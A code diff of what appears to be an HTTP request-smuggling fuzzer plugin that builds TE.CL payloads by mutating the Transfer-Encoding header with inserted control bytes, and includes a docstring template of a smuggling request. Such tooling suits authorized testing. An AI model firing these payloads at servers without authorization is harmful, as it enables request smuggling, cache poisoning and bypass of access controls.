@@ -1,9 +1,21 @@
 from pprint import pprint
 from urllib.parse import ParseResult, urlparse
-
+from rich import print  
 
 from core.types.httpRequestPrototype import HttpRequestPrototype
 
+"""
+    [ TeCl Template ] 
+
+    GET / HTTP/1.1
+    Host: example.com
+    Transfer-Encoding: chunked
+    Content-Length: 6
+    \r\n
+    0\r\n
+    \r\n
+    X
+"""
 
 class HttpTeClPlugin:
 
@@ -15,6 +27,8 @@ class HttpTeClPlugin:
         self.verbose = verbose
 
     def generate(self) -> None:
+
+        self.__normal_req()
         # Random shocking characters insertion
         self.__pointMutation()
         self.__doublePointMutation()
@@ -25,20 +39,27 @@ class HttpTeClPlugin:
     def httpTemplate(self, tecl_name: str, tecl_value: str, http_body: str = "0\r\n\r\nX") -> HttpRequestPrototype:
 
         mutant = HttpRequestPrototype(self.gadget_dict)
-        mutant.addHeader("Host", self.host)
-        mutant.addHeader("Connection", "Close")
-        mutant.addHeader(
-            "User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0")
-        mutant.addHeader(
-            "Content-type", "application/x-www-form-urlencoded; charset=UTF-8")
-        mutant.addHeader(tecl_name, tecl_value)
+        # mutant.addHeader("Host", self.host)
+        # mutant.addHeader("Connection", "Close")
+        # mutant.addHeader(
+        #     "User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:98.0) Gecko/20100101 Firefox/98.0")
+        # mutant.addHeader(
+        #     "Content-type", "application/x-www-form-urlencoded; charset=UTF-8")
+        if tecl_name and tecl_name:
+            mutant.addHeader(tecl_name, tecl_value)
+
         mutant.body = http_body
         return mutant
+
+    def __normal_req(self):
+        self.mutants_list["normal-rq"] = self.httpTemplate(None , None)
+        self.mutants_list["cl-tl-req"] = self.httpTemplate(
+            "Transfer-Encoding","chunked"
+        )
 
     def __pointMutation(self):
         # Random shocking characters insertion
         for shockers in range(0x1, 0xFF):
-
             # single mutations
             self.mutants_list["point-key-start-%02x" % shockers] = self.httpTemplate(
                 "%cTransfer-Encoding" % shockers, "chunked")
